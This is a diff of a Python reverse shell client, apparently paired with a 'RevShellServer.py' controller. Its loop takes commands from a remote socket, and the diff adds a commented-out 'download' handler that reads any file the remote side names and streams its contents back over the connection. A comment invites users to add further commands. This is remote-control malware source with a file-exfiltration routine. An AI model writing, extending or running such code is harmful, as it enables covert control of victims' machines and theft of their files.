@@ -16,6 +16,22 @@ while True:
     cmd = s.recv(1024).decode()
     if cmd.lower() in ['q', 'quit', 'x', 'exit']:
         break
+        
+    # if cmd.lower() in ['down', 'download']:
+    #     sep = '#SEP#'
+    #     file = s.recv(1024).decode()
+    #     file_size = os.path.getsize(file)
+    #     if sep in file:
+    #         print('Warning invalid filename')
+    #         exit(-1)
+    #     s.send(f'{file}{sep}{file_size}'.encode())
+    #     with open(file, 'rb') as f:
+    #         while True:
+    #             file_bytes = f.read(1024)
+    #             if not file_bytes:
+    #                 break
+    #             s.sendall(file_bytes)
+    #         f.close()
 
     # To add your own command remove the # below and change alias with the command alias and command with the command name
     # Make sure to add it to RevShellServer.py as well
